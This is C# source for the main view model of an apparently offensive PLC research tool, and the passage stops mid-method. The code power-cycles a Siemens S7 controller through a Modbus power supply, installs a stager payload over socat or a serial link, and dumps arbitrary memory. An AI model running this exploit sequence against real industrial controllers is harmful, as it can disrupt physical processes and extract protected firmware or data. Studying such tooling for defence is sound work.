using S7_Csharp_Utility.Services;
using System.Windows.Input;
using System.Threading.Tasks;
using System;
using S7.Net;
using System.ComponentModel.DataAnnotations;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.IO.Ports;
using System.Threading;
using Avalonia.Threading;

namespace S7_Csharp_Utility.ViewModels
{
    /// <summary>
    /// The main window's view model, containing the application's state and logic.
    /// </summary>
    public class MainWindowViewModel : ViewModelBase
    {
        private const string ConfigFileName = "config.json";
        private string _plcHost = "localhost";
        /// <summary>
        /// The IP address or hostname of the PLC.
        /// </summary>
        [Required]
        public string PlcHost
        {
            get => _plcHost;
            set
            {
                _plcHost = value;
                OnPropertyChanged();
            }
        }

        private int _delaySeconds = 1;
        /// <summary>
        /// The delay in seconds to wait before powering on the PLC.
        /// </summary>
        public int DelaySeconds
        {
            get => _delaySeconds;
            set
            {
                _delaySeconds = value;
                OnPropertyChanged();
            }
        }

        private int _plcPort = 102;
        /// <summary>
        /// The TCP port of the PLC.
        /// </summary>
        [Range(1, 65535)]
        public int PlcPort
        {
            get => _plcPort;
            set
            {
                _plcPort = value;
                OnPropertyChanged();
            }
        }

        private string _modbusHost = "localhost";
        /// <summary>
        /// The IP address or hostname of the Modbus-enabled power supply.
        /// </summary>
        [Required]
        public string ModbusHost
        {
            get => _modbusHost;
            set
            {
                _modbusHost = value;
                OnPropertyChanged();
            }
        }

        private int _modbusPort = 502;
        /// <summary>
        /// The TCP port of the Modbus-enabled power supply.
        /// </summary>
        [Range(1, 65535)]
        public int ModbusPort
        {
            get => _modbusPort;
            set
            {
                _modbusPort = value;
                OnPropertyChanged();
            }
        }

        private ushort _modbusCoil = 1;
        /// <summary>
        /// The Modbus coil to control the power supply.
        /// </summary>
        [Range(1, 65535)]
        public ushort ModbusCoil
        {
            get => _modbusCoil;
            set
            {
                _modbusCoil = value;
                OnPropertyChanged();
            }
        }

        private byte _modbusSlaveId = 1;
        /// <summary>
        /// The slave ID of the Modbus device.
        /// </summary>
        [Range(0, 255)]
        public byte ModbusSlaveId
        {
            get => _modbusSlaveId;
            set
            {
                _modbusSlaveId = value;
                OnPropertyChanged();
            }
        }

        /// <summary>
        /// The service responsible for logging application messages.
        /// </summary>
        public LoggingService Logging { get; }
        /// <summary>
        /// The service responsible for logging socat messages.
        /// </summary>
        public SocatLoggerService SocatLogging { get; }
        /// <summary>
        /// The service responsible for controlling the PLC's power supply.
        /// </summary>
        private readonly PowerController _powerController;

        /// <summary>
        /// Command to power on the PLC.
        /// </summary>
        public ICommand PowerOnCommand { get; }
        /// <summary>
        /// Command to power off the PLC.
        /// </summary>
        public ICommand PowerOffCommand { get; }

        private string _modbusStatus = "Disconnected";
        /// <summary>
        /// The current status of the Modbus connection.
        /// </summary>
        public string ModbusStatus
        {
            get => _modbusStatus;
            set
            {
                _modbusStatus = value;
                OnPropertyChanged();
                (ConnectModbusCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
                (DisconnectModbusCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
                (PowerOnCommand as Commands.AsyncRelayCommand)?.RaiseCanExecuteChanged();
                (PowerOffCommand as Commands.AsyncRelayCommand)?.RaiseCanExecuteChanged();
                (StartExploitSequenceCommand as Commands.AsyncRelayCommand)?.RaiseCanExecuteChanged();
            }
        }

        /// <summary>
        /// Command to connect to the Modbus host.
        /// </summary>
        public ICommand ConnectModbusCommand { get; }
        /// <summary>
        /// Command to disconnect from the Modbus host.
        /// </summary>
        public ICommand DisconnectModbusCommand { get; }

        /// <summary>
        /// The service responsible for managing stager and dumper payloads.
        /// </summary>
        private readonly S7.Net.PayloadManager _payloadManager;

        private string _dumpAddress = "0x691E28";
        /// <summary>
        /// The starting memory address for the dump, in hexadecimal format.
        /// </summary>
        [Required]
        [RegularExpression(@"^0x[0-9a-fA-F]+$", ErrorMessage = "Must be a valid hex address (e.g., 0x10000000)")]
        public string DumpAddress
        {
            get => _dumpAddress;
            set
            {
                _dumpAddress = value;
                OnPropertyChanged();
            }
        }

        private uint _dumpLength = 16;
        /// <summary>
        /// The number of bytes to dump from the memory address.
        /// </summary>
        [Range(1, uint.MaxValue)]
        public uint DumpLength
        {
            get => _dumpLength;
            set
            {
                _dumpLength = value;
                OnPropertyChanged();
            }
        }


        private bool _isUploadingStager;
        /// <summary>
        /// Indicates whether a stager is currently being uploaded.
        /// </summary>
        public bool IsUploadingStager
        {
            get => _isUploadingStager;
            set
            {
                _isUploadingStager = value;
                OnPropertyChanged();
                (StartExploitSequenceCommand as Commands.AsyncRelayCommand)?.RaiseCanExecuteChanged();
                (DumpMemoryCommand as Commands.AsyncRelayCommand)?.RaiseCanExecuteChanged();
            }
        }

        private bool _isDumpingMemory;
        /// <summary>
        /// Indicates whether a memory dump is in progress.
        /// </summary>
        public bool IsDumpingMemory
        {
            get => _isDumpingMemory;
            set
            {
                _isDumpingMemory = value;
                OnPropertyChanged();
                (DumpMemoryCommand as Commands.AsyncRelayCommand)?.RaiseCanExecuteChanged();
                (CancelDumpCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
                (StartExploitSequenceCommand as Commands.AsyncRelayCommand)?.RaiseCanExecuteChanged();
            }
        }

        /// <summary>
        /// Cancellation token source for memory dump operations.
        /// </summary>
        private CancellationTokenSource? _dumpCancellationTokenSource;

        private bool _isComparing;
        /// <summary>
        /// Indicates whether a comparison is in progress.
        /// </summary>
        public bool IsComparing
        {
            get => _isComparing;
            set
            {
                _isComparing = value;
                OnPropertyChanged();
                (CompareDumpsCommand as Commands.AsyncRelayCommand)?.RaiseCanExecuteChanged();
                (CompareTwoFilesCommand as Commands.AsyncRelayCommand)?.RaiseCanExecuteChanged();
                (DumpMemoryCommand as Commands.AsyncRelayCommand)?.RaiseCanExecuteChanged();
                (StartExploitSequenceCommand as Commands.AsyncRelayCommand)?.RaiseCanExecuteChanged();
            }
        }

        private double _dumpProgressPercentage;
        /// <summary>
        /// The progress of the memory dump as a percentage.
        /// </summary>
        public double DumpProgressPercentage
        {
            get => _dumpProgressPercentage;
            set
            {
                _dumpProgressPercentage = value;
                OnPropertyChanged();
            }
        }

        private string _dumpProgressBytes = "Read: 0 / 0 bytes";
        /// <summary>
        /// The progress of the memory dump in bytes.
        /// </summary>
        public string DumpProgressBytes
        {
            get => _dumpProgressBytes;
            set
            {
                _dumpProgressBytes = value;
                OnPropertyChanged();
            }
        }

        private string _dumpProgressTime = "Elapsed: 0s | Remaining: calculating...";
        /// <summary>
        /// The elapsed and remaining time for the memory dump.
        /// </summary>
        public string DumpProgressTime
        {
            get => _dumpProgressTime;
            set
            {
                _dumpProgressTime = value;
                OnPropertyChanged();
            }
        }


        private bool _stagerInstalled;
        /// <summary>
        /// Indicates whether the stager has been successfully installed on the PLC.
        /// </summary>
        public bool StagerInstalled
        {
            get => _stagerInstalled;
            set
            {
                _stagerInstalled = value;
                OnPropertyChanged();
                (DumpMemoryCommand as Commands.AsyncRelayCommand)?.RaiseCanExecuteChanged();
            }
        }

        /// <summary>
        /// The path to the folder containing the stager payloads.
        /// </summary>
        public string PayloadsPath
        {
            get => _payloadsPath;
            set 
            { 
                _payloadsPath = value; 
                OnPropertyChanged();
                // Automatically scan for payloads when path changes
                _ = ScanPayloadsAsync();
            }
        }
        private string _payloadsPath = Models.ApplicationConfiguration.GetPayloadsPath();

        /// <summary>
        /// Collection of discovered payloads in the selected folder.
        /// </summary>
        public ObservableCollection<S7.Net.PayloadInfo> DiscoveredPayloads { get; } = new ObservableCollection<S7.Net.PayloadInfo>();

        private bool _isScanning;
        /// <summary>
        /// Indicates whether a payload scan is in progress.
        /// </summary>
        public bool IsScanning
        {
            get => _isScanning;
            set
            {
                _isScanning = value;
                OnPropertyChanged();
            }
        }
        /// <summary>
        /// The path to the folder where memory dumps will be saved.
        /// </summary>
        public string DumpsPath
        {
            get => _dumpsPath;
            set { _dumpsPath = value; OnPropertyChanged(); }
        }
        private string _dumpsPath = Models.ApplicationConfiguration.GetDefaultDumpsPath();
        /// <summary>
        /// The path to the folder where logs will be saved.
        /// </summary>
        public string LogsPath
        {
            get => _logsPath;
            set 
            { 
                _logsPath = value; 
                OnPropertyChanged();
                // Update both logging services with the new path
                string resolvedPath = Models.ApplicationConfiguration.ResolvePath(value, Models.ApplicationConfiguration.GetDefaultLogsPath());
                Logging.UpdateLogsPath(resolvedPath);
                SocatLogging.UpdateLogsPath(resolvedPath);
            }
        }
        private string _logsPath = Models.ApplicationConfiguration.GetDefaultLogsPath();
        /// <summary>
        /// The path to the folder where extracted files will be saved.
        /// </summary>
        public string ExtractionPath
        {
            get => _extractionPath;
            set { _extractionPath = value; OnPropertyChanged(); }
        }
        private string _extractionPath = Models.ApplicationConfiguration.GetDefaultExtractionPath();

        /// <summary>
        /// Command to browse for the payloads folder.
        /// </summary>
        public ICommand BrowsePayloadsFolderCommand { get; }
        /// <summary>
        /// Command to browse for the dumps folder.
        /// </summary>
        public ICommand BrowseDumpsFolderCommand { get; }
        /// <summary>
        /// Command to browse for the logs folder.
        /// </summary>
        public ICommand BrowseLogsFolderCommand { get; }
        /// <summary>
        /// Command to browse for the extraction folder.
        /// </summary>
        public ICommand BrowseExtractionFolderCommand { get; }
        /// <summary>
        /// Command to save the configured paths.
        /// </summary>
        public ICommand SavePathsCommand { get; }
        /// <summary>
        /// Command to load default paths.
        /// </summary>
        public ICommand LoadDefaultPathsCommand { get; }
        public ICommand CheckSocatProcessesCommand { get; }
        public ICommand KillSocatProcessesCommand { get; }
        public ICommand LoadProfileCommand { get; }

        /// <summary>
        /// Command to start the exploit sequence.
        /// </summary>
        public ICommand StartExploitSequenceCommand { get; }
        /// <summary>
        /// Command to dump memory from the PLC.
        /// </summary>
        public ICommand DumpMemoryCommand { get; }
        /// <summary>
        /// Command to cancel the memory dump operation.
        /// </summary>
        public ICommand CancelDumpCommand { get; }
        /// <summary>
        /// Command to browse for a folder to compare dumps.
        /// </summary>
        public ICommand BrowseCompareFolderCommand { get; }
        /// <summary>
        /// Command to browse for the first file to compare.
        /// </summary>
        public ICommand BrowseCompareFile1Command { get; }
        /// <summary>
        /// Command to browse for the second file to compare.
        /// </summary>
        public ICommand BrowseCompareFile2Command { get; }
        /// <summary>
        /// Command to compare all dumps in a folder.
        /// </summary>
        public ICommand CompareDumpsCommand { get; }
        /// <summary>
        /// Command to compare two files.
        /// </summary>
        public ICommand CompareTwoFilesCommand { get; }

        /// <summary>
        /// The service responsible for managing the socat process.
        /// </summary>
        private readonly SocatService _socatService;
        /// <summary>
        /// A collection of available serial ports.
        /// </summary>
        public ObservableCollection<string> AvailableSerialPorts { get; } = new ObservableCollection<string>();
        private string _selectedSerialPort = string.Empty;
        /// <summary>
        /// The currently selected serial port.
        /// </summary>
        public string SelectedSerialPort
        {
            get => _selectedSerialPort;
            set
            {
                _selectedSerialPort = value;
                OnPropertyChanged();
            }
        }

        private int _socatTcpPort = 1238;
        /// <summary>
        /// The TCP port used by socat.
        /// </summary>
        public int SocatTcpPort
        {
            get => _socatTcpPort;
            set
            {
                _socatTcpPort = value;
                OnPropertyChanged();
            }
        }

        private bool _socatVerbose = true;
        /// <summary>
        /// Enables verbose output for socat (-v).
        /// </summary>
        public bool SocatVerbose
        {
            get => _socatVerbose;
            set { _socatVerbose = value; OnPropertyChanged(); }
        }

        private bool _socatHexDump = true;
        /// <summary>
        /// Enables hexadecimal dump output for socat (-x).
        /// </summary>
        public bool SocatHexDump
        {
            get => _socatHexDump;
            set { _socatHexDump = value; OnPropertyChanged(); }
        }

        private int _socatBlockSize = 4;
        /// <summary>
        /// I/O block size for socat (-b N).
        /// </summary>
        public int SocatBlockSize
        {
            get => _socatBlockSize;
            set
            {
                _socatBlockSize = value;
                OnPropertyChanged();
            }
        }

        private string _socatStatus = "Stopped";
        /// <summary>
        /// The current status of the socat service.
        /// </summary>
        public string SocatStatus
        {
            get => _socatStatus;
            set
            {
                _socatStatus = value;
                OnPropertyChanged();
                (StartSocatCommand as Commands.AsyncRelayCommand)?.RaiseCanExecuteChanged();
                (StopSocatCommand as Commands.AsyncRelayCommand)?.RaiseCanExecuteChanged();
                (StartExploitSequenceCommand as Commands.AsyncRelayCommand)?.RaiseCanExecuteChanged();
            }
        }

        /// <summary>
        /// Command to start the socat service.
        /// </summary>
        public ICommand StartSocatCommand { get; }
        /// <summary>
        /// Command to stop the socat service.
        /// </summary>
        public ICommand StopSocatCommand { get; }
        /// <summary>
        /// Command to refresh the list of available serial ports.
        /// </summary>
        public ICommand RefreshSerialPortsCommand { get; }
        /// <summary>
        /// Command to show the socat log window.
        /// </summary>
        public ICommand ShowSocatLogCommand { get; }
        /// <summary>
        /// Command to save the current configuration to a file.
        /// </summary>
        public ICommand SaveConfigurationCommand { get; }
        /// <summary>
        /// Command to load a configuration from a file.
        /// </summary>
        public ICommand LoadConfigurationCommand { get; }

        /// <summary>
        /// A collection of available communication modes.
        /// </summary>
        public ObservableCollection<string> CommunicationModes { get; } = new ObservableCollection<string> { "TCP (socat)", "Serial" };
        private string _selectedCommunicationMode = "TCP (socat)";
        /// <summary>
        /// The currently selected communication mode.
        /// </summary>
        public string SelectedCommunicationMode
        {
            get => _selectedCommunicationMode;
            set
            {
                if (_selectedCommunicationMode != value)
                {
                    _selectedCommunicationMode = value;
                    OnPropertyChanged();
                    OnPropertyChanged(nameof(IsSocatModeSelected));
                    OnPropertyChanged(nameof(IsSerialModeSelected));
                }
            }
        }

        /// <summary>
        /// Indicates whether the socat communication mode is selected.
        /// </summary>
        public bool IsSocatModeSelected => _selectedCommunicationMode == "TCP (socat)";
        /// <summary>
        /// Indicates whether the serial communication mode is selected.
        /// </summary>
        public bool IsSerialModeSelected => _selectedCommunicationMode == "Serial";

        /// <summary>
        /// A collection of available baud rates for serial communication.
        /// </summary>
        public ObservableCollection<int> AvailableBaudRates { get; } = new ObservableCollection<int> { 9600, 19200, 38400, 57600, 115200 };
        private int _selectedBaudRate = 38400;
        /// <summary>
        /// The currently selected baud rate.
        /// </summary>
        public int SelectedBaudRate
        {
            get => _selectedBaudRate;
            set
            {
                _selectedBaudRate = value;
                OnPropertyChanged();
            }
        }

        /// <summary>
        /// A collection of available parities for serial communication.
        /// </summary>
        public ObservableCollection<Parity> AvailableParities { get; } = new ObservableCollection<Parity>(Enum.GetValues(typeof(Parity)).Cast<Parity>());
        private Parity _selectedParity = Parity.Even;
        /// <summary>
        /// The currently selected parity.
        /// </summary>
        public Parity SelectedParity
        {
            get => _selectedParity;
            set
            {
                _selectedParity = value;
                OnPropertyChanged();
            }
        }

        /// <summary>
        /// A collection of available stop bits for serial communication.
        /// </summary>
        public ObservableCollection<StopBits> AvailableStopBits { get; } = new ObservableCollection<StopBits>(Enum.GetValues(typeof(StopBits)).Cast<StopBits>());
        private StopBits _selectedStopBits = StopBits.One;
        /// <summary>
        /// The currently selected stop bits.
        /// </.summary>
        public StopBits SelectedStopBits
        {
            get => _selectedStopBits;
            set
            {
                _selectedStopBits = value;
                OnPropertyChanged();
            }
        }

        /// <summary>
        /// A collection of available flow controls for serial communication.
        /// </summary>
        public ObservableCollection<Handshake> AvailableFlowControls { get; } = new ObservableCollection<Handshake>(Enum.GetValues(typeof(Handshake)).Cast<Handshake>());
        private Handshake _selectedFlowControl = Handshake.None;
        /// <summary>
        /// The currently selected flow control.
        /// </summary>
        public Handshake SelectedFlowControl
        {
            get => _selectedFlowControl;
            set
            {
                _selectedFlowControl = value;
                OnPropertyChanged();
            }
        }


        private string _compareFolder = string.Empty;
        /// <summary>
        /// The folder containing dumps to be compared.
        /// </summary>
        public string CompareFolder
        {
            get => _compareFolder;
            set
            {
                _compareFolder = value;
                OnPropertyChanged();
                (CompareDumpsCommand as Commands.AsyncRelayCommand)?.RaiseCanExecuteChanged();
            }
        }

        private string _compareFile1 = string.Empty;
        /// <summary>
        /// The first file to be compared.
        /// </summary>
        public string CompareFile1
        {
            get => _compareFile1;
            set
            {
                _compareFile1 = value;
                OnPropertyChanged();
                (CompareTwoFilesCommand as Commands.AsyncRelayCommand)?.RaiseCanExecuteChanged();
            }
        }

        private string _compareFile2 = string.Empty;
        /// <summary>
        /// The second file to be compared.
        /// </summary>
        public string CompareFile2
        {
            get => _compareFile2;
            set
            {
                _compareFile2 = value;
                OnPropertyChanged();
                (CompareTwoFilesCommand as Commands.AsyncRelayCommand)?.RaiseCanExecuteChanged();
            }
        }

        /// <summary>
        /// The service responsible for showing dialogs to the user.
        /// </summary>
        private readonly Interfaces.IDialogService _dialogService;
        /// <summary>
        /// The service responsible for saving and loading the application configuration.
        /// </summary>
        public ConfigurationService ConfigService { get; }

        private DeviceProfile? _loadedProfile;
        public DeviceProfile? LoadedProfile
        {
            get => _loadedProfile;
            set
            {
                _loadedProfile = value;
                OnPropertyChanged();
                OnPropertyChanged(nameof(MemoryRegions));
            }
        }

        public ObservableCollection<MemoryRegion> MemoryRegions => new ObservableCollection<MemoryRegion>(LoadedProfile?.Regions ?? new List<MemoryRegion>());

        private MemoryRegion? _selectedMemoryRegion;
        public MemoryRegion? SelectedMemoryRegion
        {
            get => _selectedMemoryRegion;
            set
            {
                _selectedMemoryRegion = value;
                OnPropertyChanged();
                if (_selectedMemoryRegion != null)
                {
                    DumpAddress = _selectedMemoryRegion.Address;
                    DumpLength = _selectedMemoryRegion.Size;
                }
            }
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="MainWindowViewModel"/> class.
        /// </summary>
        /// <param name="loggingService">The logging service.</param>
        /// <param name="powerController">The power controller.</param>
        /// <param name="payloadManager">The payload manager.</param>
        /// <param name="dialogService">The dialog service.</param>
        /// <param name="socatService">The socat service.</param>
        /// <param name="configService">The configuration service.</param>
        /// <param name="socatLoggerService">The socat logger service.</param>
        public MainWindowViewModel(LoggingService loggingService, PowerController powerController, S7.Net.PayloadManager payloadManager, Interfaces.IDialogService dialogService, SocatService socatService, ConfigurationService configService, SocatLoggerService socatLoggerService)
        {
            Logging = loggingService;
            SocatLogging = socatLoggerService;
            _powerController = powerController;
            _payloadManager = payloadManager;
            _dialogService = dialogService;
            _socatService = socatService;
            ConfigService = configService;

            ConnectModbusCommand = new Commands.RelayCommand(_ => ConnectModbusAsync(), _ => ModbusStatus != "Connected");
            DisconnectModbusCommand = new Commands.RelayCommand(_ => DisconnectModbus(), _ => ModbusStatus == "Connected");

            PowerOnCommand = new Commands.AsyncRelayCommand(async _ => await _powerController.SetPowerAsync(ModbusCoil, true, ModbusSlaveId), _ => ModbusStatus == "Connected");
            PowerOffCommand = new Commands.AsyncRelayCommand(async _ => await _powerController.SetPowerAsync(ModbusCoil, false, ModbusSlaveId), _ => ModbusStatus == "Connected");
            StartExploitSequenceCommand = new Commands.AsyncRelayCommand(_ => StartExploitSequenceAsync(), _ => SocatStatus == "Running" && ModbusStatus == "Connected" && !IsUploadingStager && !IsDumpingMemory && !IsComparing);
            DumpMemoryCommand = new Commands.AsyncRelayCommand(_ => DumpMemoryAsync(), _ => StagerInstalled && !IsUploadingStager && !IsDumpingMemory && !IsComparing);
            CancelDumpCommand = new Commands.RelayCommand(_ => CancelDump(), _ => IsDumpingMemory);

            BrowsePayloadsFolderCommand = new Commands.RelayCommand(async _ => { var result = await _dialogService.OpenFolderPickerAsync("Select Payloads Folder"); if(result != null) PayloadsPath = result; }, _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing);
            BrowseDumpsFolderCommand = new Commands.RelayCommand(async _ => { var result = await _dialogService.OpenFolderPickerAsync("Select Dumps Folder"); if(result != null) DumpsPath = result; }, _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing);
            BrowseLogsFolderCommand = new Commands.RelayCommand(async _ => { var result = await _dialogService.OpenFolderPickerAsync("Select Logs Folder"); if(result != null) LogsPath = result; }, _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing);
            BrowseExtractionFolderCommand = new Commands.RelayCommand(async _ => { var result = await _dialogService.OpenFolderPickerAsync("Select Extraction Folder"); if(result != null) ExtractionPath = result; }, _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing);

            BrowseCompareFolderCommand = new Commands.RelayCommand(async _ => { var result = await _dialogService.OpenFolderPickerAsync("Select Folder to Compare"); if(result != null) CompareFolder = result; }, _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing);
            BrowseCompareFile1Command = new Commands.RelayCommand(async _ => { var result = await _dialogService.OpenFilePickerAsync("Select File 1"); if(result != null) CompareFile1 = result; }, _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing);
            BrowseCompareFile2Command = new Commands.RelayCommand(async _ => { var result = await _dialogService.OpenFilePickerAsync("Select File 2"); if(result != null) CompareFile2 = result; }, _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing);
            CompareDumpsCommand = new Commands.AsyncRelayCommand(_ => CompareDumpsAsync(), _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing && !string.IsNullOrWhiteSpace(CompareFolder));
            CompareTwoFilesCommand = new Commands.AsyncRelayCommand(_ => CompareTwoFilesAsync(), _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing && !string.IsNullOrWhiteSpace(CompareFile1) && !string.IsNullOrWhiteSpace(CompareFile2));

            StartSocatCommand = new Commands.AsyncRelayCommand(_ => StartSocatAsync(), _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing && IsSocatModeSelected && SocatStatus != "Running");
            StopSocatCommand = new Commands.AsyncRelayCommand(_ => StopSocatAsync(), _ => IsSocatModeSelected && SocatStatus == "Running");
            RefreshSerialPortsCommand = new Commands.RelayCommand(_ => RefreshSerialPorts());
            ShowSocatLogCommand = new Commands.RelayCommand(_ => _dialogService.ShowSocatLogWindow());

            SaveConfigurationCommand = new Commands.RelayCommand(_ => SaveConfiguration());
            LoadConfigurationCommand = new Commands.RelayCommand(_ => LoadConfiguration());
            SavePathsCommand = new Commands.RelayCommand(_ => SaveConfiguration(), _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing);
            LoadDefaultPathsCommand = new Commands.RelayCommand(_ => LoadDefaultPaths(), _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing);

            RefreshSerialPorts();

            CheckSocatProcessesCommand = new Commands.RelayCommand(_ => CheckSocatProcesses(), _ => true);
            KillSocatProcessesCommand = new Commands.RelayCommand(_ => KillSocatProcesses(), _ => true);
            LoadProfileCommand = new Commands.RelayCommand(async _ => await LoadProfile());
            
            // Perform initial payload scan
            _ = ScanPayloadsAsync();
        }

        private async Task LoadProfile()
        {
            var path = await _dialogService.ShowOpenFileDialogAsync("Load Profile", "json", "JSON Profiles");
            if (path != null)
            {
                var profile = await ConfigService.LoadProfileAsync(path);
                if (profile != null)
                {
                    LoadedProfile = profile;
                }
            }
        }

        /// <summary>
        /// Creates a communication channel based on the selected mode (TCP or Serial).
        /// </summary>
        /// <returns>An initialized communication channel.</returns>
        private S7.Net.Interfaces.ICommunicationChannel CreateCommunicationChannel()
        {
            if (SelectedCommunicationMode == "TCP (socat)")
            {
                return new S7.Net.Channels.TcpChannel(PlcHost, SocatTcpPort);
            }
            else
            {
                return new S7.Net.Channels.SerialChannel(SelectedSerialPort, SelectedBaudRate, SelectedParity, SelectedStopBits, SelectedFlowControl);
            }
        }

        
        /// <summary>
        /// Starts the exploit sequence, which includes power cycling the PLC and installing the stager.
        /// </summary>
        private async Task StartExploitSequenceAsync()
        {
            IsUploadingStager = true;
            S7.Net.Interfaces.ICommunicationChannel? channel = null;
            try
            {
                Logging.Log("[EXPLOIT] Starting exploit sequence...", LogCategory.Info);

                // Power cycle the PLC
                Logging.Log("[POWER] Turning PLC power OFF...", LogCategory.Info);
                await _powerController.SetPowerAsync(ModbusCoil, false, ModbusSlaveId);
                Logging.Log($"[POWER] Waiting {DelaySeconds} seconds before powering on...", LogCategory.Info);
                await Task.Delay(DelaySeconds * 1000);
                Logging.Log("[POWER] Turning PLC power ON...", LogCategory.Info);
                await _powerController.SetPowerAsync(ModbusCoil, true, ModbusSlaveId);

                // Brief delay for PLC to start
                await Task.Delay(50);

                // Connect to PLC
                Logging.Log("[CONNECTION] Creating communication channel...", LogCategory.Info);
                channel = CreateCommunicationChannel();

                Logging.Log($"[CONNECTION] Connecting to PLC at {PlcHost}:{SocatTcpPort}...", LogCategory.Info);
                await channel.ConnectAsync();

                if (!channel.IsConnected)
                {
                    throw new Exception("Failed to establish connection to PLC");
                }

                Logging.Log("[CONNECTION] ✅ Connected to PLC successfully", LogCategory.Info);
                var plcClient = new S7.Net.PlcClient(channel, message => Logging.Log(message, LogCategory.Info));
                await RunStagerSequenceAsync(plcClient);
            }
            catch (TimeoutException timeoutEx)
            {
                Logging.Log($"[ERROR] ⏱️ Timeout during stager sequence: {timeoutEx.ToString()}", LogCategory.Error);
                await _dialogService.ShowMessageAsync("Timeout Error",
                    $"The operation timed out. This may happen if:\n" +
                    $"• Socat is not running or has stopped\n" +
                    $"• PLC is not responding\n" +
                    $"• Network connection issues\n\n" +
                    $"Error: {timeoutEx.Message}");
            }
            catch (System.IO.IOException ioEx)
            {
                Logging.Log($"[ERROR] 🔌 Connection error during stager sequence: {ioEx.ToString()}", LogCategory.Error);
                await _dialogService.ShowMessageAsync("Connection Error",
                    $"Connection to PLC was lost. This may happen if:\n" +
                    $"• Socat process was stopped\n" +
                    $"• Network connection was interrupted\n" +
                    $"• PLC stopped responding\n\n" +
                    $"Error: {ioEx.Message}");
            }
            catch (Exception ex)
            {
                Logging.Log($"[ERROR] ❌ Unexpected error during stager sequence: {ex.ToString()}", LogCategory.Error);
                if (ex.InnerException != null)
                {
                    Logging.Log($"[ERROR] Inner exception: {ex.InnerException.ToString()}", LogCategory.Error);
                }
                await _dialogService.ShowMessageAsync("Error", $"An error occurred during the stager sequence: {ex.Message}");
            }
            finally
            {
                try
                {
                    channel?.Disconnect();
                    Logging.Log("[CONNECTION] Disconnected from PLC", LogCategory.Debug);
                }
                catch (Exception disconnectEx)
                {
                    Logging.Log($"[WARNING] Error during disconnect: {disconnectEx.Message}", LogCategory.Warning);
                }
                IsUploadingStager = false;
                Logging.Log("[EXPLOIT] Exploit sequence completed", LogCategory.Info);
            }
        }

        /// <summary>
        /// Runs the stager installation sequence.
        /// </summary>
        /// <param name="plcClient">The PLC client.</param>
        private async Task RunStagerSequenceAsync(S7.Net.PlcClient plcClient)
        {
            StagerInstalled = false;
            if (!plcClient.IsConnected) return;

            if (await plcClient.PerformHandshakeAsync())
            {
                await plcClient.GetVersion();

                byte[] stagerPayload = await _payloadManager.GetStagerPayloadAsync(PayloadsPath);
                Logging.Log($"Loaded stager payload ({stagerPayload.Length} bytes) from {PayloadsPath}.", LogCategory.Info);

                await plcClient.InstallStager(stagerPayload);
                StagerInstalled = true;
                Logging.Log("Stager is installed and ready.", LogCategory.Info);
            }
        }

        /// <summary>
        /// Dumps the memory from the PLC.
        /// </summary>
        private async Task DumpMemoryAsync()
        {
            IsDumpingMemory = true;
            _dumpCancellationTokenSource = new CancellationTokenSource();
            S7.Net.Interfaces.ICommunicationChannel? channel = null;
            
            // Reset progress
            DumpProgressPercentage = 0;
            DumpProgressBytes = "Read: 0 / 0 bytes";
            DumpProgressTime = "Elapsed: 0s | Remaining: calculating...";
            
            try
            {
                if (!uint.TryParse(DumpAddress.Replace("0x", ""), System.Globalization.NumberStyles.HexNumber, System.Globalization.CultureInfo.CurrentCulture, out uint address))
                {
                    Logging.Log("Error: Invalid dump address. Must be a valid hex number (e.g., 0x10000000).", LogCategory.Error);
                    await _dialogService.ShowMessageAsync("Validation Error", "Invalid dump address. Must be a valid hex number (e.g., 0x10000000).");
                    return;
                }
                if (DumpLength == 0)
                {
                    Logging.Log("Error: Invalid dump length. Must be a positive number.", LogCategory.Error);
                    await _dialogService.ShowMessageAsync("Validation Error", "Invalid dump length. Must be a positive number.");
                    return;
                }

                channel = CreateCommunicationChannel();
                await channel.ConnectAsync();
                var plcClient = new S7.Net.PlcClient(channel, message => Logging.Log(message, LogCategory.Info));
                await RunDumpSequenceAsync(plcClient, address, DumpLength);
            }
            catch (OperationCanceledException)
            {
                Logging.Log("Memory dump operation was cancelled by user.", LogCategory.Info);
            }
            catch (Exception ex)
            {
                var errorMessage = $"An error occurred during the dump sequence: {ex.Message}";
                Logging.Log(errorMessage + Environment.NewLine + ex.ToString(), LogCategory.Error);
                await _dialogService.ShowMessageAsync("Error", errorMessage);
            }
            finally
            {
                channel?.Disconnect();
                _dumpCancellationTokenSource?.Dispose();
                _dumpCancellationTokenSource = null;
                IsDumpingMemory = false;
            }
        }

        /// <summary>
        /// Cancels the current memory dump operation.
        /// </summary>
        private void CancelDump()
        {
            if (_dumpCancellationTokenSource != null && !_dumpCancellationTokenSource.Token.IsCancellationRequested)
            {
                _dumpCancellationTokenSource.Cancel();
                Logging.Log("Memory dump cancellation requested.", LogCategory.Info);
            }
        }

        /// <summary>
        /// Runs the memory dump sequence.
        /// </summary>
        /// <param name="plcClient">The PLC client.</param>
        /// <param name="address">The starting memory address.</param>
        /// <param name="length">The number of bytes to dump.</param>
        private async Task RunDumpSequenceAsync(S7.Net.PlcClient plcClient, uint address, uint length)
        {
            Logging.Log($"Starting memory dump of {length} bytes from 0x{address:X8}...", LogCategory.Info);

            byte[] dumperPayload = await _payloadManager.GetMemoryDumperPayloadAsync(PayloadsPath);
            Logging.Log($"Loaded dumper payload ({dumperPayload.Length} bytes) from {PayloadsPath}.", LogCategory.Info);

            var stopwatch = System.Diagnostics.Stopwatch.StartNew();
            var progress = new Progress<long>(bytesRead =>
            {
                // This callback is invoked on whatever thread the async operation completes.
                // We must ensure UI updates are dispatched to the UI thread.
                double percentage = (double)bytesRead / length * 100;
                var elapsed = stopwatch.Elapsed;
                double bytesPerSecond = bytesRead > 0 ? bytesRead / elapsed.TotalSeconds : 0;
